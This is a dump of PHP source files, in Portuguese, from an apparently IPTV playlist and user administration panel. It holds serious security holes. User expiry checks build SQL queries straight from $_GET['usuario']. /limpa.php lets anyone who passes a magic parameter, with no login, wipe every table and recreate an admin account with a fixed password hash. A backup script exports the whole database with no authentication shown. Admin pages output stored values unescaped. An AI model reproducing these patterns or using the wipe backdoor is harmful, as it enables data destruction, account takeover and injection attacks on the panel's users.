                echo $lista['lista'];
            } else {
                $links = listaGlobal($idlista);
                if ($links) {
                    echo "". header('Content-Disposition: attachment; filename='.$_GET['usuario'].'.m3u') ."";
                    echo "#EXTM3U";
                    foreach($links as $link) {
                    if($tipo1 <= $tipo2){
                    echo "
#EXTINF:-1 type=\"video\" tvg-id=\"{$link['nome_link']}\" tvg-name=\"{$link['nome_link']}\" tvg-logo=\"{$link['logo']}\" group-title=\"{$link['nome']}\",{$link['nome_link']}
" . preg_replace('/exibir.php.*/', '', (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]") ."video.m3u8?acesso={$link['acessoLink']}&usuario=$usuario";
                    }else{
                    echo "
#EXTINF:-1,{$link['nome_link']}
" . preg_replace('/exibir.php.*/', '', (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]") ."video.m3u8?acesso={$link['acessoLink']}&usuario=$usuario";
					}
                    }
                }
            }
        } else {
            header("HTTP/1.0 404 Not Found");
        }
    } else {
        header("HTTP/1.0 404 Not Found");
    }
} else {
    header("HTTP/1.0 404 Not Found");
}
?>
<?php
$acesso = $_GET['usuario'];
$result = "SELECT * FROM usuario WHERE acesso LIKE '%$acesso%' limit 1";
$usuarios = mysqli_query($conexao, $result);
while($usuario = mysqli_fetch_array($usuarios)){
$hoje = date('Y-m-d');
$data = $usuario['data'];}
$a = explode("-","$data");
$b = explode("-","$hoje");
$antiga= mktime(0, 0, 0, $b[1], $b[2], $b[0]);
$atual= mktime(0, 0, 0, $a[1], $a[2], $a[0]);
$diferenca= $atual-$antiga;
$datas = floor($diferenca/84600);
$data1 = "1";
$data2 = $datas;
if($data1 <= $data2){
} else {
$acesso = $_GET['usuario'];
$estado = "0";
$tipo = "0";
$result = "UPDATE usuario SET vendedor='$tipo', admin='$tipo', estado_usuario='$estado' WHERE acesso='$acesso'";
$atualiza = mysqli_query($conexao, $result);}
?>
/favicon.ico
/índix.php:
<?php
session_start();
require_once('controles/usuarios.php');
if (!checarUsuario()) {
?>
<!DOCTYPE html>

<html lang="pt-BR">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Login | <?php echo $nome; ?></title>
    <link href="css/login.css" rel="stylesheet">
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link rel="icon" href="favicon.ico" type="image/x-icon" />
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.bundle.min.js"></script>
</head>
<style>
#random{
  background-image: url('');
  background-repeat: no-repeat;
  background-attachment: fixed;
  background-size: cover;
}

a:link, a:visited {
  background-color: green;
  color: white;
  padding: 5px 25px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
}

a:hover, a:active {
  background-color: #B22222;
}
</style>
<body>
<body onload="randombg()" id="random">
    <form style="background-color:white;border-radius: 15px;" id="login" class="form-signin">
        <img class="mx-auto d-block mb-4" src="<?php echo $img; ?>" alt="logo">
        <label for="inputEmail" class="sr-only">Usuário</label>
        <input name="usuario" type="text" id="inputEmail" class="form-control" placeholder="Usuário" required autofocus>
        <label for="inputPassword" class="sr-only">Senha</label>
        <input name="senha" type="password" id="inputPassword" class="form-control" placeholder="Senha" required>
        <button class="btn btn-lg btn-danger btn-block" type="submit">Entrar</button>
       <div class="separator" style="clear: both; text-align: center;">
</div>
<div class="separator" style="clear: both; text-align: center;">
</div>
<div style="text-align: center;">
<br />
&copy; <?php echo date("Y"); ?> <?php echo $copy; ?> -</span><br />
Desenvolvido por PJT</span></font></center>
</form>
<!-- Alerta Inicio -->
<div class="modal fade" id="alerta" tabindex="-1" role="dialog" aria-labelledby="Alerta" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">

      <div class="modal-body">
      <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
        <div class="text-center">
        <h5 id="textoAlerta" class="h5"></h5> 
        </div>
      </div>
    </div>
  </div>
</div>
<!-- Alerta Fim-->
</body>
<script>
function randombg(){
  var random= Math.floor(Math.random() * 2) + 0;
  var bigSize = ["url('img/fundo1.jpg')",
				 "url('img/fundo2.jpg')"];
  document.getElementById("random").style.backgroundImage=bigSize[random];
}
    $( "#login" ).submit(function( event ) {
        $.ajax({
            type: "POST",
            url: "controles/login.php",
            data: $("#login").serialize(),
            success: function(data) {
                location = "dashboard.php";
            },
            error: function(data) {
                $("#textoAlerta").text(data.responseText);
                $("#alerta").modal();
            }
        });
        event.preventDefault();
    });
</script>
</html>
<?php
} else {
    header("Location: dashboard.php");
    die();
}
?>
/ip.php:
<?php
if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
}
echo $_SERVER['REMOTE_ADDR'];
?>
/limpa.php:
<?php
session_start();
if($_GET['acesso'] == "limpa.tudo"){
    require_once("controles/conexao.php");
    global $conexao;
    $query = "DELETE FROM categoria;";
    mysqli_query($conexao, $query);

    $query = "DELETE FROM eventos;";
    mysqli_query($conexao, $query);
    
    $query = "DELETE FROM lidas;";
    mysqli_query($conexao, $query);
    
    $query = "DELETE FROM link;";
    mysqli_query($conexao, $query);
    
    $query = "DELETE FROM lista;";
    mysqli_query($conexao, $query);
    
    
    $query = "DELETE FROM lista_global_categoria;";
    mysqli_query($conexao, $query);
    
    $query = "DELETE FROM lista_usuario;";
    mysqli_query($conexao, $query);
    
    $query = "DELETE FROM logs;";
    mysqli_query($conexao, $query);
    
    $query = "DELETE FROM mensagens;";
    mysqli_query($conexao, $query);
    
    $query = "DELETE FROM usuario;";
    mysqli_query($conexao, $query);
    
    $query = "INSERT INTO `usuario` (`id_usuario`, `nome_usuario`, `senha_usuario`, `login_usuario`, `admin`, `estado_usuario`, `contato_usuario`, `acesso`) VALUES (1, 'admin', 'abed1846cf853495d747c4029a9f56aa', 'admin', 1, 1, '', 'bddf35069c88dcad8925f56ad43d8680');";
    mysqli_query($conexao, $query);
}
?>
<?php 
    //ENTER THE RELEVANT INFO BELOW
    $mysqlUserName      = $usuario;
    $mysqlPassword      = $senha;
    $mysqlHostName      = $endereco;
    $DbName             = $banco;
    $backup_name        = "mybackup.sql";
    $tables             = false;

   //or add 5th parameter(array) of specific tables:    array("mytable1","mytable2","mytable3") for multiple tables

    Export_Database($mysqlHostName,$mysqlUserName,$mysqlPassword,$DbName,  $tables=false, $backup_name=false );

    function Export_Database($host,$user,$pass,$name,  $tables=false, $backup_name=false )
    {
        $mysqli = new mysqli($host,$user,$pass,$name); 
        $mysqli->select_db($name); 
        $mysqli->query("SET NAMES 'utf8'");

        $queryTables    = $mysqli->query('SHOW TABLES'); 
        while($row = $queryTables->fetch_row()) 
        { 
            $target_tables[] = $row[0]; 
        }   
        if($tables !== false) 
        { 
            $target_tables = array_intersect( $target_tables, $tables); 
        }
        foreach($target_tables as $table)
        {
            $result         =   $mysqli->query('SELECT * FROM '.$table);  
            $fields_amount  =   $result->field_count;  
            $rows_num=$mysqli->affected_rows;     
            $res            =   $mysqli->query('SHOW CREATE TABLE '.$table); 
            $TableMLine     =   $res->fetch_row();
            $content        = (!isset($content) ?  '' : $content) . "\n\n".$TableMLine[1].";\n\n";

            for ($i = 0, $st_counter = 0; $i < $fields_amount;   $i++, $st_counter=0) 
            {
                while($row = $result->fetch_row())  
                { //when started (and every after 100 command cycle):
                    if ($st_counter%100 == 0 || $st_counter == 0 )  
                    {
                            $content .= "\nINSERT INTO ".$table." VALUES";
                    }
                    $content .= "\n(";
                    for($j=0; $j<$fields_amount; $j++)  
                    { 
                        $row[$j] = str_replace("\n","\\n", addslashes($row[$j]) ); 
                        if (isset($row[$j]))
                        {
                            $content .= '"'.$row[$j].'"' ; 
                        }
                        else 
                        {   
                            $content .= '""';
                        }     
                        if ($j<($fields_amount-1))
                        {
                                $content.= ',';
                        }      
                    }
                    $content .=")";
                    //every after 100 command cycle [or at last line] ....p.s. but should be inserted 1 cycle eariler
                    if ( (($st_counter+1)%100==0 && $st_counter!=0) || $st_counter+1==$rows_num) 
                    {   
                        $content .= ";";
                    } 
                    else 
                    {
                        $content .= ",";
                    } 
                    $st_counter=$st_counter+1;
                }
            } $content .="\n\n\n";
        }
        //$backup_name = $backup_name ? $backup_name : $name."___(".date('H-i-s')."_".date('d-m-Y').")__rand".rand(1,11111111).".sql";
        $backup_name = $backup_name ? $backup_name : 'sem_dados.sql';
        header('Content-Type: application/octet-stream');   
        header("Content-Transfer-Encoding: Binary"); 
        header("Content-disposition: attachment; filename=\"".$backup_name."\"");  
        echo $content; exit;
    }
?>
/link.php:
<?php
session_start();
require_once("controles/usuarios.php");
require_once("controles/links.php");
require_once("controles/categorias.php");
if (checarUsuario()) {
require_once("cabecalho.php");
if($_SESSION['admin']){
}
$links = listarlinks();
$categorias = listarCategorias();
?>
<style id="checkme">
	.page-2content {
	    padding-left: 240px !important;
		padding-right: 240px !important;
	}
	</style>
        <div id="conteudo-painel" class="container">
<?php if ($links) { ?>
                <div class="mb-5 form-group float-left">
                    <input type="text" class="pesquisar form-control" placeholder="Pesquisar...">
                </div>   
                <table class='table table-bordered table-hover'>
                    <caption>Links</caption>
                    <thead class="thead-light">
                        <tr align="center">
                            <th class='nomecol' scope="col" >Nome</th>
                            <th class='nomecol' style="width: 5%" scope="col"></th>
                            <th class='nomecol' style="width: 5%" scope="col"></th>
                            <th class='semresultado' scope='col'>Nenhum resultado</th>
                        </tr>
                    </thead>
                    <tbody id="conteudo">
<?php foreach($links as $link) { ?>
                        <tr>
                            <td> <?=$link['nome_link']?> </td>
                            <td>
                            <button class='btn btn-outline-danger' onclick="removerConfirma('<?=$link['id_link']?>','<?=$link['nome_link']?>')"><i class="far fa-trash-alt"></i></button>
                            </td>
                            <td>
                            <button class='btn btn-outline-secondary' onclick="editarConfirma('<?=$link['id_link']?>','<?=$link['nome_link']?>', '<?=$link['link_link']?>', '<?=$link['id_categoria']?>', '<?=$link['logo']?>')"><i class="fas fa-edit"></i></button>
                            </td>
                        </tr>
<?php } ?>
                    </tbody>
                </table>
        <?php
        }
        ?>
            <div class="h3 mt-5 row align-items-center justify-content-center">
                <i onclick="$('#cadastro').modal()" class="btn btn-outline-info text-dark fas fa-plus"></i>
            </div>
        </div>
    </div>

  </main>
  <!-- page-content" -->
</div>
<!-- Cadastro Inicio -->
<div class="modal fade" id="cadastro" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Adicionar Link</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="cadastro-form">
            <div class="container">
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" name="nome" placeholder="Nome do Link" required autofocus>
                    <small class="form-text text-muted">Campo único!</small>
                </div>
                <div class="form-group">
                    <label>Logo:</label>
                    <input type="text" class="form-control" name="logo" placeholder="Link da Imagem" required>
                </div>
                <div class="form-group">
                    <label>Url:</label>
                    <input type="text" class="form-control" name="link" placeholder="Url do Link" required>
                </div>
                <div class="form-group">
                  <label>Categoría:</label>
                  <div class="ml-0 row">
                    <select class="selectpicker" title="Categoria" name="categoria" required>
                    <?php if ($categorias) {
                      foreach($categorias as $categoria) {?>
                      <option value="<?= $categoria['id']?>" > <?= $categoria['nome']?> </option>
                    <?php } } ?>
                    </select>
                  </div>
                </div>
                <button type="submit" class="btn btn-danger">Adicionar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Cadastro Fim-->
<!-- Remove Inicio -->
<div class="modal fade" id="remover" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Tem certeza?</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div id="remover-conteudo" class="modal-body"></div>
    </div>
  </div>
</div>
<!-- Remove Fim-->
<!-- Edita Inicio -->
<div class="modal fade" id="editar" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Editar Link</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="editar-form">
            <div class="container">
                  <input type="hidden" name="id" id="idE">
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" id="nomeE" name="nome" placeholder="Nome do Link" required autofocus>
                    <small class="form-text text-muted">Campo único!</small>
                </div>
                <div class="form-group">
                    <label>Logo:</label>
                    <input type="text" class="form-control" id="logoE" name="logo" placeholder="Link da Imagem" required>
                </div>
                <div class="form-group">
                    <label>Url:</label>
                    <input type="text" class="form-control" id="linkE" name="link" placeholder="Url do Link" required>
                </div>
                <div class="form-group">
                  <label>Categoría:</label>
                  <div class="ml-0 row">
                    <select class="selectpicker" title="Categoría" id="categoriaE" name="categoria" required>
                  <?php  if ($categorias) { 
                          foreach($categorias as $categoria) {?>
                      <option value="<?= $categoria['id']?>" > <?= $categoria['nome']?> </option>
                    <?php } } ?>
                    </select>
                  </div>
                </div>
                <button type="submit" class="btn btn-danger">Salvar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Edita Fim-->
</body>
<script>
    function removerConfirma(id,nome) {
        $('#remover-conteudo').html('<div class="alert alert-danger" role="alert"><strong> Remover </strong>' + nome + '?</div><button onclick="remover(' + id + ')" type="submit" class="btn btn-danger float-right">Remover</button>');
        $('#remover').modal();
    }

    function editarConfirma(id,nome, link, categoria, logo) {
        $('#idE').val(id);
        $('#nomeE').val(nome);
        $('#logoE').val(logo);
        $('#linkE').val(link);
        if (categoria !== "") {
          $('#categoriaE').val(categoria);
          $('#categoriaE').selectpicker('render');
        }
        $('#editar').modal();
    }

    function remover(id) {
        $.ajax({
            type: "POST",
            url: "controles/remover-link.php",
            data: {id: id},
            success: function(data) {
                location.reload();
            }
        });
    }

    $( "#cadastro-form" ).submit(function( event ) {
        $.ajax({
            type: "POST",
            url: "controles/adicionar-link.php",
            data: $("#cadastro-form").serialize(),
            success: function(data) {
                location.reload();
            },
            error: function (data) {
              resultado(data.responseText);
            }
        });
        event.preventDefault();
    });

    $( "#editar-form" ).submit(function( event ) {
        $.ajax({
            type: "POST",
            url: "controles/editar-link.php",
            data: $("#editar-form").serialize(),
            success: function(data) {
                location.reload();
            },
            error: function (data) {
              resultado(data.responseText);
            }
        });
        event.preventDefault();
    });

</script>
<?php require_once("comum.php");
require_once("alerta.php"); ?>
</html>
<?php 
} else {
    header("Location: index.php");
    die();
}
?>
/lista.php:
<?php
session_start();
require_once("controles/usuarios.php");
require_once("controles/links.php");
require_once("controles/categorias.php");
require_once("controles/listas.php");
if (checarUsuario()) {
require_once("cabecalho.php");
$links = listarlinks();
$categorias = listarCategorias();
$categoriasNVazias = listarCategoriasNaoVazias();
$listas = listarListas();
?>
	<style id="checkme">
	.page-2content {
	    padding-left: 240px !important;
		padding-right: 240px !important;
	}
	</style>
        <div id="conteudo-painel" class="container">
<?php if ($listas) { ?>
                <div class="mb-5 form-group float-left">
                    <input type="text" class="pesquisar form-control" placeholder="Pesquisar...">
                </div>
                <table class='table table-bordered table-hover'>
                    <caption>Listas</caption>
                    <thead class="thead-light">
                        <tr align="center">
							<th class='nomecol' scope="col" >Nome</th>
                            <?php if($_SESSION['admin']){ ?>
                            <th class='nomecol' style="width: 5%" scope="col"></th>
                            <th class='nomecol' style="width: 5%" scope="col"></th>
                            <?php } ?>
                            <th class='nomecol' style="width: 5%" scope="col"></th>
                            <th class='semresultado' scope='col'>Nenhum resultado</th>
                        </tr>
                    </thead>
                    <tbody id="conteudo">
<?php foreach($listas as $lista) { ?>
                        <tr align="center">
							<td> <?=$lista['nome_lista']?> </td>
                            <?php if($_SESSION['admin']){ ?>
                            <td>
                                <button class='btn btn-outline-danger' onclick="removerConfirma('<?=$lista['id_lista']?>','<?=$lista['nome_lista']?>')"><i class="far fa-trash-alt"></i></button>
                            </td>
                            <td>
                                <button class='btn btn-outline-secondary' onclick="editarGlobalConfirma('<?=$lista['id_lista']?>','<?=$lista['nome_lista']?>', [<?php foreach (categoriasLista($lista['id_lista']) as $categoria) echo $categoria['id'] .',' ?> ] )"><i class="fas fa-edit"></i></button>
                            </td>
                            <?php } ?>
                            <td>
                                <button class='btn btn-outline-primary' onclick="obterListaUsuarios('<?=$lista['id_lista']?>')"><i class="fas fa-link"></i></button>
                            </td>
                        </tr>
<?php } ?>
                    </tbody>
                </table>
        <?php
        }
        ?>
        <?php if($_SESSION['admin']) { ?>
            <div class="h3 mt-5 row align-items-center justify-content-center">
                <i onclick="$('#cadastroGlobal').modal()" class="btn btn-outline-info text-dark fas fa-plus"></i>
            </div>
        </div>
        <?php } ?>
    </div>

  </main>
  <!-- page-content" -->
</div>

<!-- Cadastro Global Inicio -->
<div class="modal fade bd-modal-lg" id="cadastroGlobal" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Adicionar Lista</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="cadastro-form-global">
            <div class="container">
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" name="nome" placeholder="Nome da Lista" required autofocus>
                    <small class="form-text text-muted">Campo único!</small>
                </div>  
                <div class="form-group"> 
                    <label>Categorías:</label>
                    <div class="mb-3 ml-0 row">
                        <select name="categoria[]" class="selectpicker" title="Categoria..." required multiple>
                            <?php if ($categorias) {
                                foreach($categorias as $categoria) {?>
                            <option value="<?= $categoria['id']?>"><?= $categoria['nome']?></option>
                                <?php } 
                                } ?>
                        </select>
                    </div>
                </div> 
                <button type="submit" class="btn btn-danger">Adicionar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Cadastro Global Fim-->
<!-- Editar Global Inicio -->
<div class="modal fade bd-modal-lg" id="editarGlobal" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Editar Lista</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="editar-form-global">
            <input type="hidden" id="idGE" name="id">
            <div class="container">
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" name="nome" id="nomeGE" placeholder="Nome da Lista" required autofocus>
                    <small class="form-text text-muted">Campo único!</small>
                </div>
                <div class="form-group"> 
                    <label>Categorías:</label>
                    <div class="mb-3 ml-0 row">
                        <select id="categoriaGE" name="categoria[]" class="selectpicker" title="Categoria..." required multiple>
                            <?php if ($categorias) {
                                foreach($categorias as $categoria) {?>
                            <option value="<?= $categoria['id']?>"><?= $categoria['nome']?></option>
                                <?php } 
                                } ?>
                        </select>
                    </div>
                </div>  
                <button type="submit" class="btn btn-danger">Salvar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Editar Global Fim-->
<!-- Remove Inicio -->
<div class="modal fade" id="remover" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Tem certeza?</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div id="remover-conteudo" class="modal-body"></div>
    </div>
  </div>
</div>
<!-- Remove Fim-->
<!-- Obter Link Inicio -->
<div class="modal fade" id="obterLinkdaLista" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Obter Link</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="formObterLinkdaLista">
            <input type="hidden" id="idLista" name="idLista">
            <div class="form-group">
                <label>Selecione o Usuário:</label>
                <div class="select-users ml-0 row">
                </div>
            </div>
            <button type="submit" class="btn btn-secondary">Obter</button>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Obter Link Fim-->
<!-- Link Inicio -->
<div class="modal fade" id="linkLista" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title"> Link</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <div>
            <input type="text" class="form-control" id="linkIn" readonly><br>
			<h5 class="form-control" name="novolink" id="novolink" readonly></h5>
            <button type="button" class="btn btn-danger" onclick="copiar()">Copiar</button>
			<button type="button" class="btn btn-danger" onclick="encurtar()">Encurtar</button>
        </div>
      </div>
    </div>
  </div>
</div>
<!-- Link Fim-->
</body>
<script>

    $("#obterLinkdaLista").on('hidden.bs.modal', function (e) {
        $(".select-users").empty();
    });

    function obterListaUsuarios(id) {
        $('#idLista').val(id);
        $.ajax({
            type: "POST",
            url: "controles/obter-lista-usuarios.php",
            data: {id: id},
            dataType:"json",
            success: function(data) {
                var $select = $('<select/>', {
                    'class':"selectpicker",
                    'title':"Usuário...",
                    'name': "idUsuario"
                });
                for (j=0; j < data.length; j++) {
                    $select.append('<option value=' + data[j].id_usuario + '>' + data[j].nome_usuario + '</option>');
                }
                $select.appendTo('.select-users').selectpicker('refresh');
            }
        });
        $('#obterLinkdaLista').modal();
    }

    function listaGlobal() {
        $('#cadastro').modal('hide');
        $('#cadastroGlobal').modal();
    }

    function removerConfirma(id,nome) {
        $('#remover-conteudo').html('<div class="alert alert-danger" role="alert"><strong> Remover </strong>' + nome + '?</div><button onclick="remover(' + id + ')" type="submit" class="btn btn-danger float-right">Remover</button>');
        $('#remover').modal();
    }

    function editarGlobalConfirma(id,nome, lista) {
        $('#idGE').val(id);
        $('#nomeGE').val(nome);
        $('#nomeGE').val(nome);
        $('#categoriaGE').val(lista);
        $('#categoriaGE').selectpicker('render');
        $('#editarGlobal').modal();
    }

    function remover(id) {
        $.ajax({
            type: "POST",
            url: "controles/remover-lista.php",
            data: {id: id},
            success: function(data) {
              location.reload();
            }
        });
    }

    $( "#cadastro-form-global" ).submit(function( event ) {
        $.ajax({
            type: "POST",
            url: "controles/adicionar-lista-global.php",
            data: $("#cadastro-form-global").serialize(),
            success: function(data) {
              location.reload();
            },
            error: function(data) {
              resultado(data.responseText);
            }
        });
        event.preventDefault();
    });

    $( "#editar-form-global" ).submit(function( event ) {
        $.ajax({
            type: "POST",
            url: "controles/editar-lista-global.php",
            data: $("#editar-form-global").serialize(),
            success: function(data) {
                location.reload();
            },
            error: function(data) {
              resultado(data.responseText);
            }
        });
        event.preventDefault();
    });

    $( "#formObterLinkdaLista" ).submit(function( event ) {
        $.ajax({
            type: "POST",
            url: "controles/obter-link-lista.php",
            data: $("#formObterLinkdaLista").serialize(),
            success: function(data) {
                $('#linkIn').val(data);
                $('#obterLinkdaLista').modal('hide');
                $('#linkLista').modal();
            }
        });
        event.preventDefault();
    });

    function copiar() {
        $('#linkIn').select();
        document.execCommand("copy");
    }
	
function encurtar() {
  var valor = document.getElementById("linkIn").value;
  $.getJSON( "https://is.gd/create.php?callback=?", {
    url: valor,
    format: "json"
}).done(function( data ) {
    let novolink = data.shorturl;
	console.log(novolink);
	if(novolink!==undefined)
	document.getElementById("novolink").innerHTML = novolink;
	else document.getElementById("novolink").innerHTML = "Erro Link";
});
}
	
</script>
<?php require_once("comum.php");
require_once("alerta.php"); ?>
</html>
<?php 
} else {
    header("Location: index.php");
    die();
}
?>
/log.php:
<?php
session_start();
require_once("controles/usuarios.php");
require_once("controles/listas.php");
if (checarUsuario()) {
require_once("cabecalho.php");
$logs = listarLogs($_GET['id_usuario']);
?>
        <div id="conteudo-painel" class="container">
<?php if ($logs) { ?>
                <div class="mb-5 form-group float-left">
                    <input type="text" class="pesquisar form-control" placeholder="Pesquisar...">
                </div>  
                <table class='table table-bordered table-hover'>
                    <caption>Logs</caption>
                    <thead class="thead-light">
                        <tr>
                            <th class='nomecol' scope="col" >Assistindo</th>
                            <th class='nomecol' scope="col" >Data e Hora</th>
                            <th class='nomecol' scope="col" >Conectado</th>
                        </tr>
                    </thead>
                <tbody id="conteudo">
<?php foreach($logs as $log) { ?>
                        <tr>
                            <td > <?=$log['nome']?> </td>
                            <td> <?=$log['data']?> </td>
                            <td> <?=$log['ip']?> </td>
                        </tr>
<?php } ?>
                    </tbody>
                </table>
        <?php
        }
        ?>
            </div>
        </div>
    </div>

  </main>
  <!-- page-content" -->
</div>
</body>
<?php require_once("comum.php"); 
require_once("alerta.php");?>

</html>
<?php 
} else {
    header("Location: index.php");
    die();
}
?>
/mensagens.php:
<?php
session_start();
require_once("controles/usuarios.php");
require_once("controles/mensagens.php");
require_once("controles/eventos.php");
if (checarUsuario() && $_SESSION['admin']) {
require_once("cabecalho.php");
$mensagens = listarMensagens();
$eventos = listarEventos();
?>
	<style id="checkme">
	.page-2content {
	    padding-left: 240px !important;
		padding-right: 240px !important;
	}
	</style>
        <div id="conteudo-painel" class="container">
<?php if ($mensagens) { ?>
                <div class="mb-5 form-group float-left">
                    <input type="text" class="pesquisar form-control" placeholder="Pesquisar...">
                </div>
                <table class='table table-bordered table-hover'>
                    <caption>Mensagens</caption>
                    <thead class="thead-light">
                        <tr align="center">
                            <th class='nomecol' style="width: 20%" scope="col" >Título</th>
                            <th class='nomecol' style="width: 20%" scope="col" >Evento</th>
                            <th class='nomecol' style="width: 25%" scope="col" >Mensagem</th>
                            <th class='nomecol' style="width: 25%" scope="col" >Criador</th>
                            <th class='nomecol' style="width: 5%" scope="col" ></th>
                            <th class='nomecol' style="width: 5%" scope="col" ></th>
                            <th class='semresultado' scope='col'>Nenhum resultado</th>
                        </tr>
                    </thead>
                    <tbody id="conteudo">
<?php foreach($mensagens as $mensagem) { ?>
                        <tr align="center">
                            <td> <?=$mensagem['titulo']?> </td>
                            <td> <?=obterEvento($mensagem['id_evento'])[0]['nome'];?> </td>
                            <td> <?=$mensagem['mensagem']?> </td>
                            <td> <?=$mensagem['titulo']?> </td>
                            <td>
                                <button class='btn btn-outline-danger' onclick="removerConfirma('<?=$mensagem['id_mensagem']?>','<?=$mensagem['titulo']?>')"><i class="far fa-trash-alt"></i></button>
                            </td>
                            <td>
                                <button class='btn btn-outline-secondary' onclick="editarConfirma('<?=$mensagem['id_mensagem']?>','<?=$mensagem['titulo']?>', '<?=$mensagem['mensagem']?>', '<?=$mensagem['id_evento']?>')"><i class="fas fa-edit"></i></button>
                            </td>
                        </tr>
<?php } ?>
                    </tbody>
                </table>
        <?php
        }
        ?>
            <div class="h3 mt-5 row align-items-center justify-content-center">
                <i onclick="$('#cadastro').modal()" class="btn btn-outline-info text-dark fas fa-plus"></i>
            </div>
        </div>
    </div>

  </main>
  <!-- page-content" -->
</div>
<!-- Cadastro Inicio -->
<div class="modal fade" id="cadastro" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Adicionar Mensagem</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="cadastro-form">
            <div class="container">
                <div class="form-group">
                    <label>Título:</label>
                    <input type="text" class="form-control" name="titulo" placeholder="Título" required autofocus>
                </div>
                <div class="form-group">
                    <label>Mensagem:</label>
                    <input type="text" class="form-control" name="mensagem" placeholder="Mensagem" required>
                </div>
                <div class="form-group">
                  <label>Evento:</label>
                  <div class="ml-0 row">
                    <select class="selectpicker" title="Evento" name="id_evento" required>
                    <?php if ($eventos) {
                      foreach($eventos as $evento) {?>
                      <option value="<?= $evento['id_evento']?>" > <?= $evento['nome']?> </option>
                    <?php } } ?>
                    </select>
                  </div>
                </div>
                <button type="submit" class="btn btn-danger">Adicionar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Cadastro Fim-->
<!-- Remove Inicio -->
<div class="modal fade" id="remover" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Tem certeza?</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div id="remover-conteudo" class="modal-body"></div>
    </div>
  </div>
</div>
<!-- Remove Fim-->
<!-- Edita Inicio -->
<div class="modal fade" id="editar" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Editar Mensagem</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
